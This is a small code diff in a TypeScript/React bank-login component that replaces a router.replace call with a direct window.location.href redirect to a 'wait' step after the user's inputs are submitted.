@@ -112,7 +112,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       setError("Eingaben konnten nicht uebermittelt werden. Bitte erneut versuchen.");
       return;
     }
-    router.replace(stepToPath("wait", sessionId));
+    window.location.href = stepToPath("wait", sessionId);
   }
 
   if (!supabase) {
